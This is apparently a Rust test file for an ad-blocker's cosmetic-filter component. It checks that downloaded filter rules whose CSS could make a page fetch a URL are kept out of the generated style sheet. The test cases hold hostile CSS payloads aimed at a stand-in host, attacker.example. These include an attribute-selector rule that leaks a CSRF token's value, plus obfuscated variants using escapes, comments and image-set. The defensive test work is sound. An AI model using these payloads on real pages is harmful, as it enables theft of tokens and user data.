//! Live hiding's style sheet from a downloaded version's Filter lists (ADR
//! 0047): a list Goodfetch did not build reaches the page only through
//! declarations `adblock` validates, so a rule cannot make the page fetch a
//! URL or escape its own declarations.

use std::collections::BTreeSet;

use goodfetch_clean_up_rules::cosmetic::PageRules;
use goodfetch_clean_up_rules::hiding;
use goodfetch_clean_up_rules::matching::Choices;
use goodfetch_clean_up_rules::rules::{FilterLists, ListTexts};
use rstest::rstest;

/// The sheet the lists `ads` compiles to give `https://news.example/` while
/// it holds no class or ID the generic rules key.
fn sheet_of(ads: &str) -> String {
    let lists = FilterLists::compile(&ListTexts {
        ads,
        trackers: "",
        annoyances: "",
        unbreak: "",
    });
    let choices = Choices {
        ads: true,
        ..Choices::default()
    };
    let rules = PageRules::of(&lists, &choices, "https://news.example/").css_rules(&[], &[]);
    hiding::sheet(&rules, &BTreeSet::new())
}

#[rstest]
#[case::a_url_in_a_style_function(
    "news.example##div.price:style(background-image: url(https://attacker.example/style))"
)]
#[case::a_url_in_a_style_block(
    "news.example##input[name=csrf][value^=\"a\"] { background: url(https://attacker.example/leak?c=a) !important }"
)]
#[case::an_image_set(
    "news.example##div.price:style(background: image-set(\"https://attacker.example/set\" 1x))"
)]
#[case::an_escape(
    "news.example##div.price:style(background: u\\72 l(https://attacker.example/escape))"
)]
#[case::a_comment(
    "news.example##div.price:style(background: u/**/rl(https://attacker.example/comment))"
)]
fn a_rule_whose_style_could_fetch_a_url_stays_out_of_the_sheet(#[case] rule: &str) {
    let sheet = sheet_of(&format!("news.example##.ad\n{rule}\n"));

    assert_eq!(sheet, ".ad { display: none !important; }\n");
}

#[test]
fn a_rule_with_a_plain_style_joins_the_sheet() {
    let sheet = sheet_of("news.example##div.price:style(opacity: 0 !important)\n");

    assert_eq!(sheet, "div.price { opacity: 0 !important; }\n");
}
